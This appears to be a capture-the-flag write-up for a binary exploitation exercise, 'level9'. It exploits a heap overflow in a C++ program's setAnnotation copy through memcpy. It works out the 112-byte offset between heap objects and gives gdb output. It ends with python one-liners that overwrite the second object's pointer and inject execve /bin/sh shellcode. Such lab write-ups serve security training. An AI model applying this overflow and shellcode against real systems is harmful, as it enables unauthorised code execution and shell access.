So this time we have something that looks like c++ instead of C
It makes two object allocations, of each 108 Bytes and then calls a copy constructor, and while our patter generator doesn't help us get an address, it helps us see that we can crash with a 109 input

109 crashes on unknown address while more crashes in main

We also see that there is no bash call or hidden functions, so we'll need a shellcode

There are also a bunch of functions related to the class N, and we can see that the copy constructor uses strlen as well as memcpy, this is our entry point.

Since the new operator creates heap objects, we should be able to do something about it.

The first object is created, the second after it, the vulnerable setAnnotation is called and afterwards we call the second object as a function.

Knowing this, we should be able to overwrite the content of the second object with the memcpy of the first and afterwards get it ;launched. So we need the offset

The first object is at 0x0804a008 and the second one at 0x0804a078
That's a 0x70 difference, or 112 

4 + 108
this* = 0x804a008
    112
    108 + 4
this00* = 0x08 04 a0 78

python -c 'print("A" * 112 +"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")'


```gdb
Starting program: /home/user/level9/level9 $(python -c 'print("A" * 112 +"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")')

Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
(gdb) info registers
eax            0x41414141	1094795585

```
So now the program crashes on the dereferencing step, we'll need to add the address to our second object for it to deref and then step into the shellcode 


python -c 'print("A" * 108 + "\x78\xa0\x04\x08"  +"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")'